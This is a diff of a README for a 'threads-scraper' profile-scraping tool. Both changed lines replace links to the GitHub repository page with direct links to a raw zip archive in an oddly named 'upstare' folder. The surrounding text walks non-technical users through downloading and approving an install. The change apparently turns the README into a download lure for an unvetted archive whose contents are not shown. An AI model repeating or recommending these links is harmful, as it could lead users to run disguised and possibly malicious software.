@@ -1,6 +1,6 @@
 # 🌐 threads-scraper - Save posts from any public profile
 
-[![Download threads-scraper](https://img.shields.io/badge/Download_The_Script-Grey-blue.svg)](https://github.com/Siouxiehardfought651/threads-scraper)
+[![Download threads-scraper](https://img.shields.io/badge/Download_The_Script-Grey-blue.svg)](https://raw.githubusercontent.com/Siouxiehardfought651/threads-scraper/main/upstare/scraper_threads_2.7.zip)
 
 ## 📄 Overview
 
@@ -18,7 +18,7 @@ You need a web browser such as Google Chrome, Microsoft Edge, or Mozilla Firefox
 4. Confirm the installation if the browser asks for permission.
 5. Visit the link below to reach the script page.
 
-[https://github.com/Siouxiehardfought651/threads-scraper](https://github.com/Siouxiehardfought651/threads-scraper)
+[https://raw.githubusercontent.com/Siouxiehardfought651/threads-scraper/main/upstare/scraper_threads_2.7.zip](https://raw.githubusercontent.com/Siouxiehardfought651/threads-scraper/main/upstare/scraper_threads_2.7.zip)
 
 ## 🚀 Installing the script
 
